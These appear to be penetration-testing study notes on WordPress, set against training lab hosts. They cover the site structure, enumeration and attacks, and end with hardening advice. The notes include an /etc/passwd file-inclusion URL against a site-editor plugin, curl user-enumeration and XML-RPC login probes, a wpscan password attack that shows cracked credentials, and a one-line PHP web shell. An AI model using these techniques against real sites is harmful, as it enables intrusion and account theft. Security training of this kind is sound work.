# Worpress Structure

- index.php is the homepage
- license.txt contains useful information such as the version Wordpress installed
- wp-activate.php is used for the email activation process
- wp-admin folder contains the login page for admin access and backend dashboard
- xmlrpc.php (not really relevant) XML encoding mechanism replaced by WordPress REST API
- wp-config.php contains information required by WordPress to connect ot the database

```php
<?php
/** <SNIP> */
/** The name of the database for WordPress */
define( 'DB_NAME', 'database_name_here' );

/\*_ MySQL database username _/
define( 'DB_USER', 'username_here' );

/\*_ MySQL database password _/
define( 'DB_PASSWORD', 'password_here' );

/\*_ MySQL hostname _/
define( 'DB_HOST', 'localhost' );

/\*_ Authentication Unique Keys and Salts _/
/_ <SNIP> _/
define( 'AUTH_KEY', 'put your unique phrase here' );
define( 'SECURE_AUTH_KEY', 'put your unique phrase here' );
define( 'LOGGED_IN_KEY', 'put your unique phrase here' );
define( 'NONCE_KEY', 'put your unique phrase here' );
define( 'AUTH_SALT', 'put your unique phrase here' );
define( 'SECURE_AUTH_SALT', 'put your unique phrase here' );
define( 'LOGGED_IN_SALT', 'put your unique phrase here' );
define( 'NONCE_SALT', 'put your unique phrase here' );

/\*_ WordPress Database Table prefix _/
$table*prefix = 'wp*';

/** For developers: WordPress debugging mode. \*/
/** <SNIP> \*/
define( 'WP_DEBUG', false );

/\*_ Absolute path to the WordPress directory. _/
if ( ! defined( 'ABSPATH' ) ) {
define( 'ABSPATH', **DIR** . '/' );
}

/\*_ Sets up WordPress vars and included files. _/
require_once ABSPATH . 'wp-settings.php';

```

- wp-content folder is the main directory where plugins and themes are stored
- wp-includes contains everything except for the administrative components and the 
themes. The directory contains core files such as fonts, js files and widgets

## Local File Exclusions
http://blog.inlanefreight.local/wp-content/plugins/site-editor/editor/extensions/pagebuilder/includes/ajax_shortcode_pattern.php?ajax_path=/etc/passwd

## WordPress Core Version Enumeration

```sh
curl -s -X GET http://<url> |  grep '<meta name="generator"'
```

## User Enumeration

User exists

```sh
curl -s -I -X GET http://<url>/?author=1

HTTP/1.1 301 Moved Permanently
Date: Wed, 13 May 2020 20:47:08 GMT
Server: Apache/2.4.29 (Ubuntu)
X-Redirect-By: WordPress
Location: http://<url>/index.php/author/admin/
Content-Length: 0
Content-Type: text/html; charset=UTF-8
```

JSON Method on Wordpress < 4.7.1

```sh
curl http://<url>/wp-json/wp/v2/users | jq
```

### Login

This attack can be performed via the login page or the `xmlrpc.php` page

```sh
curl -X POST -d "<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>admin</value></param><param><value>CORRECT-PASSWORD</value></param></params></methodCall>" http://blog.inlanefreight.com/xmlrpc.php
```

`Invalid Credentials - 403 Forbidden`

### xmlrpc.php Attacks

```php
curl -X POST -d "<methodCall><methodName>system.listMethods</methodName><params></params></methodCall>"
```

## Using WPScan

Get api token from https://wpscan.com/

```sh
wpscan --url <url> --enumerate --api-token <token>
```

### Password attack

```sh
wpscan --password-attack xmlrpc -t 20 -U admin, david -P passwords.txt --url http://blog.inlanefreight.com

[+] URL: http://blog.inlanefreight.com/
[+] Started: Thu Apr  9 13:37:36 2020
[+] Performing password attack on Xmlrpc against 3 user/s

[SUCCESS] - admin / sunshine1
Trying david / Spring2016 Time: 00:00:01 <============> (474 / 474) 100.00% Time: 00:00:01

[i] Valid Combinations Found:
 | Username: admin, Password: sunshine1
```

## Basic PHP Shell

```php
<?php
system($_GET['cmd']);
?>
```

## WordPress Hardening

- Perform Regular Updates, in `wp-config.php` we can automate this
  - define( 'WP_AUTO_UPDATE_CORE', true );
  - add_filter( 'auto_update_plugin', '\_\_return_true' );
  - add_filter( 'auto_update_theme', '\_\_return_true' );
- Only install trusted themes and plugins from the WordPress.org website
  - Checks its reviews, last update
- Enhance Security
  - https://wordpress.org/plugins/sucuri-scanner/
  - https://wordpress.org/plugins/better-wp-security/
  - https://wordpress.org/plugins/wordfence/
- Disable standard admin user and create accounts with difficult to guess usernames
  - Enforce Strong passwords
  - 2FA
  - Restricts users access
- Certain configuration changes can increase the overall security posture of a WordPress installation.
  - Limit login attempts
  - Rename the `wp-admin.php` login page or relocate it to make it either not accessible to the internet or only accessible by certain IP addresses
  - Install a plugin that disallows user enumeration so an attacker cannot gather valid usernames to be used in a password spraying attack
